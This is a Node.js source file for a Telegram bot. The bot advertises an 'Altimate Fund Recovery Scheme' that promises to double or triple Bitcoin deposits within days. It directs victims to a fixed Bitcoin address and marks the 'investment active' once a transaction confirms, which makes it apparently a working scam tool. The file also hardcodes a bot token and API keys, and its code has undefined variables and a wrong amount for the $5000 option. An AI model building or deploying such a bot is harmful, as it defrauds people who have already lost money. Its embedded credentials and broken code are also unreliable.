const { Telegraf } = require("telegraf");
require("dotenv").config();
const bot = new Telegraf("5684702362:AAEJCx4G9gkPuOnTxJMcKyhTqr8M6QlRtik");
const cryptApi =
  "b35b5494a17fe1ffadba60f5fb976dc849f94fc0255100ffe252e6617044f23b";
const axios = require("axios");
const express = require("express");
// Import Moralis

const app = express();

// Add a variable for the api key, address and chain

// app.get("/", (req, res) => {
//   res.send("Hello World!");
// });

// Add this a startServer function that initialises Moralis
const startServer = async () => {
  app.listen(port, () => {
    console.log(`Example app listening on port ${port}`);
  });
};

app.get("/", async (req, res) => {
  try {
    // Get and return the crypto data
    const data = await confirmTRX();
    res.status(200);
    res.json("done");
  } catch (error) {
    // Handle errors
    console.error(error);
    res.status(500);
    res.json({ error: error.message });
  }
});

const fetchExchange = async () => {
  let ethToUSD = undefined;
  await axios
    .get("https://min-api.cryptocompare.com/data/price?fsym=btc&tsyms=USD")
    .then(function (response) {
      ethToUSD = response.data;
    });

  return ethToUSD;
};
const confirmTRX = async (value) => {
  let ethToUSD = undefined;

  await axios({
    method: "get",
    url: `https://ubiquity.api.blockdaemon.com/v1/bitcoin/mainnet/tx/${value}/confirmations`,

    headers: {
      "X-API-Key": "bd1b3JbyUz8TQIRKDVuvocTzYZkZE9JPvjAPu0m0kiuplpo",
      Authorization: `Bearer ${"bd1b3JbyUz8TQIRKDVuvocTzYZkZE9JPvjAPu0m0kiuplpo"}`,
    },
  })
    .then(function (response) {
      ethToUSD = response;
    })
    .catch((err) => console.log("ConfirmTRX Error", err));

  return ethToUSD;
};
// fetchExchange().then((r) => console.log(r));
bot.command("start", (ctx) => {
  bot.telegram.sendMessage(
    ctx.chat.id,
    "THE ALTIMATE FUND RECOVERY SCHEME" +
      "\n" +
      "WE ARE INTRODUCING THE ALTIMATE FUND RECOVERY SCHEME, IT AN INVESTMENT PLAN WHICH HELPS INVESTORS WHO MADE HUGE LOSES IN THIS BEARISH MARKET RECOVER MOST OF THERE LOSS." +
      "\n" +
      "GRAB THE OPPORTUNITY NOW AND RECOVER MOST OF YOUR LOSS." +
      "\n" +
      "2 DAYS INVESTMENT PLAN" +
      "\n" +
      "\n" +
      " invest 1000$ get 2000$" +
      "\n" +
      "invest 2000$ get 4000$" +
      "\n" +
      "7 DAYS INVESTMENT PLAN" +
      "\n" +
      "\n" +
      "invest 5000$ get 15000$     " +
      "\n" +
      "invest 10000$ get 25000$" +
      "\n" +
      "invest 20000$ get 50000$" +
      "\n" +
      "\n" +
      "✅Payment method:" +
      "\n" +
      "BITCOIN" +
      "\n" +
      "\n" +
      "✅Confirm Method:" +
      "\n" +
      "Send 'Check Payment' " +
      "\n" +
      "or" +
      "\n" +
      "Click the last button in the menu",
    requestPhoneKeyboard,
    {}
  );
});
bot.hears("Pay $1000", async (ctx) => {
  ctx.reply(`Copy and send the amount provided to the address after this`);
  ctx.reply("bc1qflsgha4hn6y2efs2ghv7l99qgmactc6mpvhprk");
  const value = await fetchExchange();

  bot.telegram.sendMessage(
    ctx.chat.id,
    (1000 / value.USD).toFixed(3),

    {}
  );
});
bot.hears("Pay $2000", async (ctx) => {
  ctx.reply(`Copy and send the amount provided to the address after this`);
  ctx.reply("bc1qflsgha4hn6y2efs2ghv7l99qgmactc6mpvhprk");
  const value = await fetchExchange();

  bot.telegram.sendMessage(
    ctx.chat.id,
    (2000 / value.USD).toFixed(3),

    {}
  );
});
bot.hears("Pay $5000", async (ctx) => {
  ctx.reply(`Copy and send the amount provided to the address after this`);
  ctx.reply("bc1qflsgha4hn6y2efs2ghv7l99qgmactc6mpvhprk");
  const value = await fetchExchange();

  bot.telegram.sendMessage(
    ctx.chat.id,
    (1000 / value.USD).toFixed(3),

    {}
  );
});
bot.hears("Pay $10000", async (ctx) => {
  ctx.reply(`Copy and send the amount provided to the address after this`);
  ctx.reply("bc1qflsgha4hn6y2efs2ghv7l99qgmactc6mpvhprk");
  const value = await fetchExchange();

  bot.telegram.sendMessage(
    ctx.chat.id,
    (10000 / value.USD).toFixed(3),

    {}
  );
});
bot.hears("Pay $20000", async (ctx) => {
  ctx.reply(`Copy and send the amount provided to the address after this`);
  ctx.reply("bc1qflsgha4hn6y2efs2ghv7l99qgmactc6mpvhprk");
  const value = await fetchExchange();

  bot.telegram.sendMessage(
    ctx.chat.id,
    (20000 / value.USD).toFixed(3),

    {}
  );
});

bot.hears("Check Payment", (ctx) => {
  bot.telegram.sendMessage(
    ctx.chat.id,
    "Send your transaction id (Txid) provided for confirmation",

    {}
  );
});

// bot.hears("Cancel", (ctx) => {
//   bot.stop();
// });

bot.on("text", async (ctx) => {
  try {
    if (ctx.message.text.length == 64) {
      ctx.telegram.sendMessage(ctx.message.chat.id, `Checking Transaction`);
      try {
        const data = await confirmTRX(ctx.message.text);
        console.log("data", data?.data);

        if (data?.data !== null && data?.data.confirmations >= 3) {
          ctx.reply(`Your Investment is active`);
        } else {
          ctx.reply(`Not Confirmed, try again later`);
        }
      } catch {
        ctx.reply("No transaction found, try again later");
      }
    } else {
      ctx.reply("Only send Bitcoin TXid");
    }
  } catch (e) {
    console.log("text error", e);
  }
});

const requestPhoneKeyboard = {
  reply_markup: {
    one_time_keyboard: true,
    keyboard: [
      ["Pay $1000"],
      ["Pay $2000"],
      ["Pay $5000"],
      ["Pay $10000"],
      ["Pay $20000"],
      ["Check Payment"],
    ],
  },
};

app.get("/favicon.ico", function (req, res) {
  res.status(204);
  res.end();
});
app.use(function (req, res, next) {
  if (req.originalUrl && req.originalUrl.split("/").pop() === "favicon.ico") {
    return res.sendStatus(204);
  }

  return next();
});
function ignoreFavicon(req, res, next) {
  if (req.originalUrl.includes("favicon.ico")) {
    res.status(204).end();
  }
  next();
}
ignoreFavicon();
if (q.url === "/favicon.ico") {
  r.writeHead(200, { "Content-Type": "image/x-icon" });
  r.end();
  console.log("favicon requested");
}
bot.launch();
exports.handler = async (event) => {
  try {
    await bot.handleUpdate(JSON.parse(event.body));
    return { statusCode: 200, body: "" };
  } catch (e) {
    console.error("error in handler:", e);
    return {
      statusCode: 400,
      body: "This endpoint is meant for bot and telegram communication",
    };
  }
};
